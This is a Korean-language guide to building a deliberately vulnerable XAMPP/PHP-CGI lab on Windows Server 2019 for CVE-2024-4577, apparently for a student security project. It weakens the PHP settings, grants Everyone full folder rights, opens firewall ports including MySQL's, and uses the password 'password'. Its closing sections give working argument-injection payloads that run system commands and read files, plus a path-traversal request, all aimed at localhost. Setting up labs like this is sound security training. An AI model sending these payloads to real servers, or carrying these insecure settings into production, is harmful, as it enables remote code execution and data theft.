# Windows Server 2019 + XAMPP 설정 가이드
## CVE-2024-4577 취약점 구현

---

## 📋 1단계: XAMPP 설치

```powershell
# 1. XAMPP 다운로드
# https://sourceforge.net/projects/xampp/files/XAMPP%20Windows/8.1.25/
# xampp-windows-x64-8.1.25-0-VS16-installer.exe 다운로드

# 2. 설치 실행
# C:\xampp 경로에 설치

# 3. PHP 버전 확인 (취약 버전이어야 함)
C:\xampp\php\php.exe --version
# PHP 8.1.25 (취약 버전) ✅
```

---

## 📋 2단계: Git으로 프로젝트 복사

```powershell
# 1. Git 설치
winget install Git.Git

# 2. 프로젝트 클론
cd C:\
git clone https://github.com/Ggoon23/HyundaiAutoever_ITsecurity_project4.git

# 3. website 폴더를 htdocs로 복사
xcopy "C:\HyundaiAutoever_ITsecurity_project4\1x_inv\website" "C:\xampp\htdocs\1x_inv" /E /I /Y

# 4. 권한 설정
icacls "C:\xampp\htdocs\1x_inv" /grant Everyone:(OI)(CI)F /T
```

---

## 📋 3단계: Apache PHP-CGI 설정 ⭐ 가장 중요!

### 3-1. httpd.conf 수정

```powershell
# 파일 열기
notepad C:\xampp\apache\conf\httpd.conf
```

**파일 끝에 추가:**

```apache
# ============================================
# CVE-2024-4577 Vulnerability Configuration
# PHP-CGI Mode (Required for CVE-2024-4577)
# ============================================

# CGI 모듈 활성화
LoadModule cgi_module modules/mod_cgi.so
LoadModule actions_module modules/mod_actions.so

# PHP-CGI 설정
ScriptAlias /php-cgi "C:/xampp/php/php-cgi.exe"
Action application/x-httpd-php "/php-cgi"
AddHandler application/x-httpd-php .php

# 1x_inv 디렉토리 설정
<Directory "C:/xampp/htdocs/1x_inv">
    Options +ExecCGI +Indexes
    AllowOverride All
    Require all granted

    # CGI 강제 적용
    SetHandler application/x-httpd-php
</Directory>
```

### 3-2. php.ini 수정

```powershell
# 파일 열기
notepad C:\xampp\php\php.ini
```

**다음 항목 수정:**

```ini
; CGI 설정 (CVE-2024-4577 필수)
cgi.force_redirect = 0
cgi.fix_pathinfo = 1

; 취약점 활성화 (테스트용)
allow_url_include = On
allow_url_fopen = On

; 에러 표시
display_errors = On
display_startup_errors = On
error_reporting = E_ALL

; 보안 기능 비활성화 (테스트용)
disable_functions =
open_basedir =

; 파일 업로드
file_uploads = On
upload_max_filesize = 10M
post_max_size = 10M
```

---

## 📋 4단계: MySQL 데이터베이스 설정

### 4-1. MySQL 시작

```powershell
# XAMPP Control Panel 실행
C:\xampp\xampp-control.exe

# Apache, MySQL 시작 버튼 클릭
```

### 4-2. 데이터베이스 생성

```powershell
# phpMyAdmin 접속
# http://localhost/phpmyadmin

# 또는 명령줄에서
C:\xampp\mysql\bin\mysql.exe -u root

# SQL 실행:
CREATE DATABASE ota_db CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
CREATE USER 'admin'@'localhost' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON ota_db.* TO 'admin'@'localhost';
FLUSH PRIVILEGES;
exit;
```

### 4-3. 테이블 생성

```powershell
# init-db.sql 실행
C:\xampp\mysql\bin\mysql.exe -u root ota_db < C:\xampp\htdocs\1x_inv\init-db.sql
```

---

## 📋 5단계: API 설정

```powershell
# config.php 생성
notepad C:\xampp\htdocs\1x_inv\api\config.php
```

**내용:**

```php
<?php
// Database configuration
define('DB_HOST', 'localhost');
define('DB_NAME', 'ota_db');
define('DB_USER', 'admin');
define('DB_PASS', 'password');

// Upload configuration
define('UPLOAD_DIR', '../uploads/');
define('MAX_FILE_SIZE', 5 * 1024 * 1024); // 5MB
?>
```

---

## 📋 6단계: Apache 재시작

```powershell
# XAMPP Control Panel에서
# Apache Stop → Start

# 또는 명령줄에서
net stop Apache2.4
net start Apache2.4
```

---

## 📋 7단계: 취약점 테스트

### 테스트 1: 웹사이트 접속

```
http://localhost/1x_inv/
http://localhost/1x_inv/support.php
```

### 테스트 2: PHP-CGI 모드 확인

```
http://localhost/1x_inv/support.php?lang=ko&page=test

# 페이지 소스에서 확인:
# Server API: CGI/FastCGI ✅ (중요!)
# mod_php가 아니어야 함!
```

### 테스트 3: phpinfo() 확인

```powershell
# 임시 테스트 파일 생성
echo "<?php phpinfo(); ?>" > C:\xampp\htdocs\1x_inv\test.php

# 브라우저에서 접속
http://localhost/1x_inv/test.php

# 확인 사항:
# Server API: CGI/FastCGI ✅
# PHP Version: 8.1.25 ✅
# allow_url_include: On ✅
```

### 테스트 4: CVE-2024-4577 공격 테스트

```bash
# PowerShell에서 실행
$url = "http://localhost/1x_inv/support.php?lang=ko%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
$body = "<?php phpinfo(); ?>"
Invoke-WebRequest -Uri $url -Method POST -Body $body

# 성공하면 phpinfo 출력됨!
```

---

## 📋 8단계: 방화벽 설정 (외부 접속 시)

```powershell
# 방화벽 규칙 추가
New-NetFirewallRule -DisplayName "Apache HTTP" -Direction Inbound -LocalPort 80 -Protocol TCP -Action Allow
New-NetFirewallRule -DisplayName "Apache HTTPS" -Direction Inbound -LocalPort 443 -Protocol TCP -Action Allow
New-NetFirewallRule -DisplayName "MySQL" -Direction Inbound -LocalPort 3306 -Protocol TCP -Action Allow
```

---

## 🔍 문제 해결

### 문제 1: "Server API: mod_php" 로 표시됨

**해결:**
```apache
# httpd.conf에서 mod_php 비활성화
# 다음 라인들을 주석 처리 (# 추가)

#LoadModule php_module "C:/xampp/php/php8apache2_4.dll"
#AddHandler application/x-httpd-php .php
#PHPIniDir "C:/xampp/php"
```

### 문제 2: 403 Forbidden 에러

**해결:**
```powershell
# 폴더 권한 확인
icacls C:\xampp\htdocs\1x_inv

# Everyone 권한 추가
icacls "C:\xampp\htdocs\1x_inv" /grant Everyone:(OI)(CI)F /T

# uploads 폴더 확인
mkdir C:\xampp\htdocs\1x_inv\uploads
icacls "C:\xampp\htdocs\1x_inv\uploads" /grant Everyone:(OI)(CI)F /T
```

### 문제 3: MySQL 접속 오류

**해결:**
```powershell
# MySQL 서비스 시작
net start MySQL

# 비밀번호 확인
C:\xampp\mysql\bin\mysql.exe -u root
# 비밀번호 없으면 Enter

# api/config.php에서 DB_PASS 수정
```

### 문제 4: CVE-2024-4577 작동 안 함

**체크리스트:**
- [ ] PHP 버전이 8.1.25 이하인가?
- [ ] Server API가 CGI/FastCGI인가?
- [ ] cgi.fix_pathinfo = 1 설정되었나?
- [ ] Windows 환경인가? (리눅스는 안됨)
- [ ] allow_url_include = On 인가?

---

## 📊 최종 확인 체크리스트

```powershell
# 한 번에 확인
powershell -Command "
Write-Host '=== XAMPP 설정 확인 ===' -ForegroundColor Green
Write-Host 'PHP Version:' (C:\xampp\php\php.exe --version | Select-String 'PHP')
Write-Host 'Apache Status:' (Get-Service -Name Apache2.4).Status
Write-Host 'MySQL Status:' (Get-Service -Name MySQL).Status
Write-Host ''
Write-Host '접속 URL:' -ForegroundColor Yellow
Write-Host 'http://localhost/1x_inv/'
Write-Host ''
Write-Host 'CVE-2024-4577 테스트:' -ForegroundColor Red
Write-Host 'http://localhost/1x_inv/support.php?lang=ko%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input'
"
```

**체크리스트:**
- [ ] XAMPP 설치 완료
- [ ] Git으로 프로젝트 복사
- [ ] httpd.conf 수정 (PHP-CGI 설정)
- [ ] php.ini 수정 (CGI 활성화)
- [ ] MySQL 데이터베이스 생성
- [ ] init-db.sql 실행
- [ ] api/config.php 생성
- [ ] Apache 재시작
- [ ] PHP-CGI 모드 확인 (phpinfo)
- [ ] CVE-2024-4577 테스트 성공

---

## 🎯 공격 테스트 명령어

```powershell
# 1. 기본 정보 수집
Invoke-WebRequest http://localhost/1x_inv/support.php?page=../docker-compose.yml

# 2. phpinfo 실행 (CVE-2024-4577)
$url = "http://localhost/1x_inv/support.php?lang=ko%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
Invoke-WebRequest -Uri $url -Method POST -Body "<?php phpinfo(); ?>"

# 3. 시스템 명령 실행
$url = "http://localhost/1x_inv/product.php?lang=en%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
Invoke-WebRequest -Uri $url -Method POST -Body "<?php system('whoami'); ?>"

# 4. 파일 읽기
$url = "http://localhost/1x_inv/company.php?lang=ko%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
Invoke-WebRequest -Uri $url -Method POST -Body "<?php echo file_get_contents('C:\\Windows\\System32\\drivers\\etc\\hosts'); ?>"
```

---

**완료 후 연락주세요!** 🚀
